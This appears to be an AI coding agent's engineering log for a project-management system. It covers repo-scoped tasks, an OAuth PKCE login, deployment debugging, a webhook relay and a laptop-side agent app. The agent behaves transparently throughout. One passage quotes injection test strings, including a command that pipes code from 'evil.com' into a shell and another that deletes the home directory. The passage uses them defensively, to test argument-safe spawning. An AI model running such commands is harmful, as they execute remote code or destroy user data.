## 2026-08-22 (later) — repo-scoped tasks, story grouping, task dependencies

The real question this was for: one Nexus project covers multiple actual repos (frontend, backend, ...) — how does an agent sitting in one specific repo know which tasks are "its" tasks, and how does it know backend-before-frontend ordering? Checked the schema directly instead of guessing (`pm-system/prisma/schema.prisma`) and found three mechanisms already modeled, none of them exposed through `/api/v1/*` yet:

- **`GitRepository`** — a project can register multiple repos, each with its own `repoUrl`. `Task.repositoryId` links a task to one specific repo. This is the actual designed-for answer to "which task is for this repo."
- **`Story`** — groups tasks under one epic; sibling tasks sharing a `storyId` are the natural "one feature, one task per repo" unit. Already had real data to confirm this pattern (PEA-T048/T049/T050 share a `storyId`).
- **`Task.blockedById`** (+ reverse `blocks`) — literal single-predecessor dependency field, exactly the "do X before Y" signal. Confirmed via a schema comment that this is the one actually used by the product's task-detail/badges/backlog UI, not the richer `TaskDependency` table (that one's additive, for the Gantt view's multi-dependency FS/SS/FF/SF needs — out of scope here).

**Backend changes (`pm-system`):**
- `GET /api/v1/tasks` and `GET /api/v1/tasks/:id` — added `story`, `repository`, `blockedBy`, `blocks` to the Prisma include (were being silently dropped before, client had no way to see them even though the columns existed).
- `GET /api/v1/tasks` — added `storyId` and `repositoryId` query filters (mirrors the existing `status`/`assigneeId` pattern).
- New route `GET /api/v1/repositories?projectId=&repoUrl=` — lists registered repos for a project. Gated by `projects:read` (didn't add a new scope — a GitRepository is project config, not a separate resource, and adding a new scope would've orphaned every already-issued token). Selects only safe fields — excludes `webhookSecret`, `aiReviewApiKey`.
- Typechecks clean (`tsc --noEmit`, exit 0, both times).

**Reality check before building the client side:** queried the live DB directly (`prisma.gitRepository.findMany()`) — **zero `GitRepository` rows exist for the PEA project.** The mechanism is real but nothing's registered yet. Didn't fabricate a repo record myself (that's real project config, not something to guess at from an agent) — the matching logic is built and will start working the moment someone registers this repo through the product's own UI.

**Client changes (`nexus-mcp`):**
- `Task` type extended: `storyId`/`story`, `repositoryId`/`repository`, `blockedById`/`blockedBy`/`blocks`.
- New `GitRepository` type + `listRepositories()`.
- `ProjectDetector` rewritten — now tries git-remote → `GitRepository` matching first (exact repo, not just project), falls back to the existing branch-task-key-prefix heuristic if the repo isn't registered. Cache now stores `{project, repository}` together.
- New tools: `get_current_repository` (explicit "not registered yet" result, not an error — that's a normal state), `list_story_tasks` (siblings by story — usable today, no backend gap). `list_my_tasks` gained an optional `repositoryId` param.
- Typechecks clean, rebuilt.

**Not done:** end-to-end test against real data — blocked on nothing existing to match against yet (no repos, no story-linked tasks in active use, no blockedBy links set by anyone). `list_story_tasks` is the one piece with real data behind it (PEA-T048/049/050) and should be testable now. `blockedById`-based sequencing depends entirely on PM/BA actually setting it when planning work — the tooling can only surface it, not invent it.

## 2026-08-24 — OAuth login (loopback PKCE), blocked on pm-system redeploy

**Why:** user asked, after the plugin work above, whether step 1 (login) could be easier — specifically "login through the system like Claude does," i.e. browser-based, no manual token paste. The earlier session (2026-08-19-ish) had concluded OAuth was a dead end for third-party tools — that conclusion turned out to be wrong, or at least stale.

**Re-verified from source, not memory:** read `pm-system/src/app/api/auth/nexus/{authorize,token,refresh}/route.ts` directly. `authorize`'s redirect_uri check is `redirectUri.startsWith("vscode://") || /^http:\/\/127\.0\.0\.1:\d+\//.test(redirectUri)` — any loopback port works, and there's no `client_id`/per-app allowlist gating it (that's a separate, unrelated `/api/oauth/authorize` Developer Portal system). A `gh auth login`-style flow — local HTTP server on a random `127.0.0.1` port, browser opened to `/authorize` with PKCE, wait for the redirect back — is structurally possible with zero pm-system changes, per the source.

**Built, on the client side (`nexus-mcp`):**
- `src/auth/pkce.ts` — S256 verifier/challenge generation.
- `src/auth/browser.ts` — best-effort cross-platform browser opener (`open`/`start`/`xdg-open`), always paired with printing the URL since opening can silently fail (headless box, no default browser).
- `src/cli/login.ts` — OAuth is now the default (`nexus-mcp-login`); `--manual` flag or `NEXUS_TOKEN` env var falls back to the old PAT-paste flow for headless machines. Also dropped the previously-required `NEXUS_API_URL` export — defaults to the production URL now, still overridable.
- `TokenStore.ts` — `TokenSet` is now `PatTokenSet | OAuthTokenSet`; old `{token, email}` keychain entries with no `type` are still read correctly (treated as PAT) so nobody already logged in gets silently logged out.
- `NexusClient.ts` — `getBearerToken()` picks PAT-as-is or a valid/refreshed OAuth access token; `refreshOAuth()` calls `/api/auth/nexus/refresh` and **persists the rotated refresh token** (the server revokes the old one on every use — reusing it would break the next refresh). `getCurrentMember()` returns the OAuth `user` directly for OAuth logins — no more email-matching against `/api/v1/members`, so the whole class of "no member found" errors (the Windows teammate's bug) can't happen on this path anymore.
- Typechecks clean, builds clean.

**Real blocker found during smoke-testing, not guessed:** ran the built `login.js` against the real `NEXUS_API_URL=http://27.254.62.17:8090` — it printed a well-formed authorize URL (verified the `127.0.0.1:<port>` regex matches in a standalone `node -e` check first, to rule out a client-side bug). Then `curl`'d that exact URL directly against production: **400, `"redirect_uri must be vscode:// or http://127.0.0.1"`** — the same rejection the original 2026-08-19 investigation hit. But the local `pm-system` checkout's `authorize/route.ts` (committed 2026-06-12, no local uncommitted diff) already has the permissive port-accepting regex. Conclusion: **what's deployed at `27.254.62.17:8090` doesn't match this local checkout** — this repo has no working git remote and deploys happen out-of-band, so local-vs-live drift isn't automatically caught. Not a code bug on either side as far as I can tell — a deployment gap.

**Status:** all client-side OAuth code is done, typechecked, and committed locally — not pushed (same MComScience/tanakorncode credential mismatch as everything else this session). Not yet usable until pm-system is redeployed with whatever's currently checked out locally. User is redeploying now and will come back to re-test — re-run the same `curl .../authorize?...` smoke test (or just `nexus-mcp-login` for real) once they confirm, before declaring this done.

**Deploy chased down mid-session:** first redeploy attempt still 400'd on the real endpoint. Compiled build output (`.next/standalone/`, dated Jul 16) already had the correct regex baked in — ruled that out by grepping the minified route.js directly. Root cause was `docker-compose restart` reusing the already-running container's existing image instead of picking up the freshly-built one; `docker-compose.prod.yml` uses `network_mode: host` with a fixed `image: pm-system:latest` tag, so a plain `build` + `restart` doesn't swap what's actually running — needs `docker-compose up -d --build` (or at least `up -d` after building) to recreate the container against the new image. Passed this along; user re-deploying properly now.

## 2026-08-24 — OAuth login verified end-to-end, second pm-system bug found and fixed

**Chased the production deploy for a while, kept 400'ing.** Traced it through three rounds: (1) build artifacts on disk had the right regex but the running container was stale — `docker-compose restart` reuses the current image, doesn't pick up a freshly built one, needs `up -d --build`; (2) after that, still 400'd — turned out the server's deploy source (`/var/www/project-management` on a separate Ubuntu box) doesn't track the same repo state as this Mac's checkout, and the `origin` remote (`tanakorncode/project-management`) is currently unreachable ("Repository not found") so it's unclear how/whether the two ever sync. Rather than keep debugging infrastructure blind, switched to running pm-system locally (`docker-compose up -d postgres` + `npm run dev`, `.env` already pointed `DATABASE_URL` at the real remote Postgres so it's real data, not a seed) to unblock verifying the client code.

**Confirmed real end-to-end against localhost:** `nexus-mcp-login` — browser opened, logged in as Tech Lead, redirected back, code exchanged, `{type: "oauth", user: {...}, accessToken, refreshToken}` landed in the keychain. `getCurrentMember()` resolved correctly.

**Second bug, found immediately after:** `listProjects()` — a real `/api/v1/*` call using the stored OAuth token — 401'd. Root cause: `/api/v1/*`'s `verifyAppToken()` only recognizes `pm_...` personal access tokens (SHA-256 hash lookup against `AppToken`); the OAuth flow issues a JWT (`signAccessToken`, meant for the internal `/api/nexus/*` surface used by official extensions) — two unrelated token systems, never designed to be interchangeable. This is a second, independent bug from the redirect_uri one — the loopback flow working didn't mean the resulting token was usable.

**Fixed in pm-system** (commit `2e93453`, `token-auth.ts`/`rate-limiter.ts` + all 12 `/api/v1/*` route files): added `verifyBearerToken()` — dispatches to the existing `verifyAppToken()` for `pm_`-prefixed tokens, or a new `verifyOAuthAccessToken()` (verifies the JWT via the existing `verifyToken()`, wildcard-scoped since a real login implies full access as that person) otherwise. Every route's `authenticate()` helper is identical boilerplate calling `verifyAppToken(raw)` — confirmed this before touching anything by diffing three of the twelve files — so the fix was a mechanical `verifyAppToken` → `verifyBearerToken` swap at each call site, no other changes needed per-route. `checkRateLimit`/`logRequest` widened to accept `appId: string | null` and no-op on null, since OAuth requests have no `App` row and `AppUsageLog.appId` is a required FK — can't log/rate-limit against nothing. Typechecked clean (pre-existing unrelated `.test.ts` type errors across ~150 files ruled out by name — none touch the files this change touched).

**Re-verified after the fix, same session:** `listProjects()` against `localhost:3000` with the already-stored OAuth token → real data back (`PEA LINE Official Account`). Full loop confirmed: browser login → keychain → `/api/v1/*` call → real response.

**Not done:** none of this is live in production yet — both the redirect_uri regex (committed 2026-06-12, per earlier entry) and this JWT-acceptance fix (`2e93453`, today) need an actual production deploy from a source that matches what's tested here, which is still an open question given the remote/deploy-sync issues above. `pea_pm_db` (a *separate*, empty local Postgres container from `docker-compose.yml`) got started during this chase but was never used — `.env`'s `DATABASE_URL` points at the real remote DB, so local `npm run dev` was testing against real production data the whole time, not a local seed. Left running/unused, harmless, can be torn down.

## 2026-08-24 — production redirect_uri saga, finally resolved

**The mystery, finally cracked:** the local-vs-production regex mismatch that kicked off this whole day's OAuth debugging turned out to be three separate, stacked issues, not one:

1. **Stale container** — `docker-compose restart` doesn't pick up a freshly built image; needs `up -d --build`. Fixed on the user's side, no code change.
2. **`127.0.0.1` silently rewritten to `localhost`** somewhere between client and the Node process — confirmed real via a temporary `console.log` in `authorize/route.ts`, deployed, and read back from `docker logs`: the value the app actually received was `"http://localhost:9999/callback"` for a request that unambiguously sent `127.0.0.1`. Reproduced even with `curl --noproxy '*'` against `localhost:8090` *on the server itself* — ruled out client-side, proxy env vars, and (via a full grep) this app's own source. Never identified the actual layer doing it (no server access to dig further) — **fixed pragmatically instead of chasing it**: `authorize/route.ts`'s regex now accepts both `127.0.0.1` and `localhost` (`32edb51`), and `token/route.ts`'s redirect_uri equality check normalizes both sides the same way before comparing (`375b211`), in case the rewrite doesn't apply consistently between the GET (query string) and POST (JSON body) legs of the flow.
3. **`0.0.0.0` in the login redirect** — found only by testing the *fixed* endpoint against production for real: the 307's `Location` header pointed at `http://0.0.0.0:8090/login`, unreachable from any actual browser. Exact same class of bug as the task-url issue from 2026-08-2x (`4df1005`) — `req.nextUrl.origin` doesn't reflect the real public origin behind this deployment's reverse proxy. Fixed by routing both the login-page URL and the post-login `callbackUrl` through the same `publicAppUrl()` helper already used for task URLs (`9afb7f7`), instead of `req.nextUrl.origin`/`.toString()`.

**Verified for real, against production, not just locally:** `nexus-mcp-login` end to end — browser opened to the real `27.254.62.17:8090`, logged in as Tech Lead, redirected back, token exchanged and stored. Test epic created during this check was deleted immediately after.

**Retrospective:** every one of these three would have been individually invisible without actually testing against the deployed target — `tsc`/`next build`/local dev all passed clean the whole way through. The lesson that stuck hardest: when a fix "should" work and doesn't, the fastest real signal is a temporary log statement read back from the actual failing environment, not another round of re-reading source code that's already been read twice.

**Comment webhook event, in pm-system.** The team wants near-real-time handoff between machines/people instead of one side polling Nexus for status. Checked what already existed rather than assuming: `AppWebhook`/`AppWebhookDelivery` infra was already there (HMAC-SHA256 signed, 3x retry with 1s/4s/16s backoff, 10s timeout per attempt), but only `task.status_changed`, `task.created`, `task.deleted`, and a few sprint/project events actually called `dispatch()` — comments didn't. Also found the registration endpoint's `VALID_EVENTS` allowlist was out of sync with reality in both directions: it allowed subscribing to `task.updated`/`project.created`/`member.added`/`ping`, none of which any code ever dispatches, while rejecting `sprint.created`/`backlog.task-estimated`/`grooming.session.completed`, which do fire. Added `dispatch("task.comment_created", {task, comment, actor})` to the comments POST route, with just enough task context (key, name, projectId, assignee, additionalAssignees, url) for a downstream consumer to route without a follow-up API call, and added the event to `VALID_EVENTS`. Verified for real: registered a temporary App + webhook + PAT, POSTed a real comment through `/api/v1/tasks/:id/comments`, confirmed the `AppWebhookDelivery` row had the exact expected payload shape and the 3x-retry behavior (target was an unreachable URL on purpose). All test data (comment, App, token, webhook) deleted after.

**Relay service, new: `nexus-mcp/relay/`.** The actual cross-machine trigger mechanism turned out not to be what was first assumed. There's a `RemoteTrigger` tool action `create_webhook_trigger`, but per Claude Code's own docs the only supported webhook-style event source is GitHub (PR/release events) — no generic custom-source webhook attachment exists. The real mechanism for external systems is the routine `/fire` API (`POST https://api.anthropic.com/v1/claude_code/routines/{id}/fire`), which requires `Authorization: Bearer <per-routine-token>` + `anthropic-beta: experimental-cc-routine-2026-04-01` + `anthropic-version` headers and takes a freeform `text` body — incompatible with pm-system's webhook sender, which only ever sends `Content-Type`/`X-PM-Event`/`X-PM-Signature` and can't be told to add arbitrary headers per-target. Also, pm-system's webhook is workspace-wide (not project-scoped), so something has to decide *whose* routine a given task event belongs to.

Wrote a small dependency-free relay (`server.mjs`, Node built-ins only — `http`/`crypto`/`fs`) that sits in between: verifies the pm-system HMAC signature, acks `200` immediately (before any outbound call — `/fire` has no idempotency key, and pm-system retries on non-2xx/timeout, so a slow response here would risk double-firing someone's routine), resolves the task's assignee + additionalAssignees against a `routing.json` member→routine map, and fires each matched routine with a short text summary. Verified the whole pipeline locally without spending real routine-run quota: bad signature → 401 rejected before any outbound call; valid signature + matched member → real request sent to the real Anthropic endpoint with a deliberately-fake token, got back a real `401 authentication_error` (proves headers/URL/shape are correct — Anthropic only starts a session on `200`, so this was safe to send for real); valid signature + no matching member → skipped, no outbound call at all.

**Not done / left for the team:** each person still has to create their own routine + generate their own API trigger token (no API for that — has to be done in the claude.ai/code/routines UI), and hand the routine id + token to whoever maintains the routing config. The relay itself needs deploying somewhere pm-system's server can reach — not deployed anywhere yet, this session only built and locally verified it. `summarize()` only has real cases for the two wired events; anything else falls through to a generic default line.

**Addendum, same day — pm-system's server turned out to have no inbound access from outside** (internal company box), which the docker-compose-alongside-pm-system deployment assumed. Refactored the relay into `lib.mjs` (shared signature verify / routing / summarize / fire logic) plus two thin entrypoints: `server.mjs` (unchanged behavior, self-hosted) and a new `api/webhook.js` for Vercel — pm-system only needs *outbound* HTTPS to fire the webhook, which company firewalls essentially always allow even with inbound locked down, so a public Vercel deployment sidesteps the reachability problem entirely.

The Vercel entrypoint deliberately uses the Web Standard `fetch` handler (`export default { fetch(request) {...} }`) rather than Vercel's `(req, res)` Node-helper convention — checked Vercel's own docs first because getting this wrong would silently break signature verification: the Node-helper `request.body` is pre-parsed from JSON before the handler runs, which would make the HMAC (computed over pm-system's exact raw bytes) unverifiable, while the Web Standard `Request` gives raw access via `request.text()`. Also switched routing config to prefer a `ROUTING_JSON` env var over a mounted file (`lib.mjs`'s `loadRouting()` tries the env var first, falls back to file) since Vercel has no persistent disk to hand it a file — the self-hosted path keeps working exactly as before via the file fallback.

One real behavior change from this refactor, on both entrypoints: notifications are now *awaited* before responding, not fired in the background after an immediate ack. The original fire-and-forget design assumed a long-running process; on Vercel, execution can be frozen the instant the response is sent, so anything left running after that isn't guaranteed to complete. Traded away the "ack fast so pm-system never sees a slow response" property for correctness — acceptable since routine fires are normally sub-second, documented as a known limit (a very slow Anthropic-side response could still approach pm-system's retry timeout and double-fire, no dedupe on either side).

Verified without spending real routine-run quota, same technique as before: called `api/webhook.js`'s exported `fetch()` directly with constructed Web `Request` objects (bad signature → 401 before any outbound call; valid signature + matched member → real request to the real Anthropic endpoint with a fake token, got a real `401 authentication_error` back, proving headers/shape survive the refactor; GET request → 404). Re-ran the original three `server.mjs` test cases too, to confirm the extraction into `lib.mjs` didn't change self-hosted behavior.

## 2026-08-26 (later) — relay/routine approach abandoned; landed on notify-server + local agent app instead

The whole `relay/` design above got overtaken by facts learned the same day, in order:

1. **Claude Code routines are GitHub-only** — confirmed against actual docs, not assumed. `create_webhook_trigger`'s only real event source is GitHub PR/release events; the routine `/fire` API needs a routine to exist first, and routine creation itself requires selecting a GitHub repo (even for API-only, non-coding routines — the platform clones it into a VM regardless). This team's real code lives on a self-hosted GitLab instance. No config fixes this; it's a hard platform limitation.
2. **GitLab CI/CD ruled out by the user**, explicitly and repeatedly — each project already has its own deploy pipeline and didn't want anything (even an isolated, gated, never-auto-triggered job) added to those files.
3. **A shared self-hosted runner** (`claude -p` on the same server as pm-system/relay) hit a real auth wall: running headless `claude` for multiple different people from one shared OS account has no clean per-person credential story, and the user correctly didn't want to build one.

None of that was a detection problem — the relay's pm-system→Redis→wherever pipeline worked fine the whole time. It was specifically "where does an unattended process that can push real code to GitLab live, and whose credentials does it use" that had no good answer in the cloud or on a shared server.

**What actually works**: run the agent on the *developer's own machine* — they already have real GitLab access and an already-authenticated `claude` CLI, so there's no new auth problem at all. The only remaining question was reachability (a laptop has no stable inbound path), solved by flipping the direction: the laptop dials **out** to a small always-on server, instead of anything trying to dial in. Landed on:

```
pm-system (dispatch()) --Redis publish--> notify-server (WebSocket) --outbound connection--> agent-app (per laptop) --spawns--> local AI CLI
```

**pm-system side** (`bc19a1c`): `dispatch()` in `webhook-dispatcher.ts` now also calls a new `publishEvent()` (`src/lib/api-platform/event-publisher.ts`) that publishes to a Redis channel (`nexus:events`) pm-system already has a live connection string for (`REDIS_URL`, same one BullMQ uses) — no new infra, no-ops if `REDIS_URL` isn't set, matching this codebase's existing convention for Redis-optional features. This is completely independent of the existing webhook/HMAC system — same event, two consumers.

**`notify-server/`** (new, `60a5f6d`): subscribes to that Redis channel, holds one WebSocket per connected teammate (`?memberId=...&secret=...`, one shared secret since this never leaves a trusted network), and forwards each event to whichever `task.assignee`/`additionalAssignees` member currently has a socket open. No queue/replay for anyone offline — accepted as fine at this team's scale. Verified for real, twice: once standalone against real production Redis with a bare `ws` test client, then again through the *actual* `agent-app/lib/ws-client.js` module, plus a full chain test firing a real comment through pm-system's live dev server and watching it arrive at a connected client with the exact right payload.

**`agent-app/`** (new, `3c11abc`): the actual thing running on each teammate's laptop. Electron, not a bare script — the user specifically wanted "install once, double-click, done," ruling out anything requiring PM2/Node knowledge from non-technical hands (a BA doesn't need any of this — they're already covered by the email notifications from earlier today; this app is opt-in for developers only). Tray icon, `setLoginItemSettings({openAtLogin: true})` for zero-touch autostart, a settings window (server/memberId/secret/command/workdir + a Test button — catches "command not found" at setup time, not silently the first time a real task comes in), and an activity window streaming live output from whatever's running.

The one part that needed real care: the configured command executes user-controlled content (task/comment text from Nexus, writable by anyone with API access to that project) as part of an AI prompt. `lib/command.js` tokenizes the command template *before* substituting `{{prompt}}`, then spawns with `shell: false` — so the prompt, however weird its contents, always lands as a single opaque argv element, never parsed as shell syntax. Didn't just reason about this — ran actual injection-attempt strings (`` "; rm -rf ~ #" ``, `` "$(curl evil.com | sh)" ``) through a real spawned `echo` process and confirmed they printed back literally instead of executing.

**What's real vs. what isn't yet**: this dev environment's own Electron binary download was blocked (left a ~50KB stub instead of the ~100MB+ real app), so the GUI shell itself — tray icon, settings/progress windows — could not be launched and visually confirmed here. Everything underneath it was: `lib/command.js` (including the injection tests above), `lib/store.js`'s settings persistence, and `lib/ws-client.js` against a real running `notify-server`. `npm start` on an unrestricted machine is the remaining check before this goes to the team. Packaging (`electron-builder`) is wired but unsigned (Gatekeeper/SmartScreen will warn on first run) and the auto-update feed URL in `package.json` is a placeholder — needs actual static file hosting set up before `electron-updater` has anything real to check against.

**Also shipped the same day, simpler and already fully working**: plain email notifications (`4d82598` in pm-system) for anyone who doesn't need auto-continue-work — reuses `mailer.ts`, which already existed in the codebase but was never wired to task events. Covers BA/PM/anyone regardless of tooling; production just needs `SMTP_*` env vars set, which it doesn't have yet.
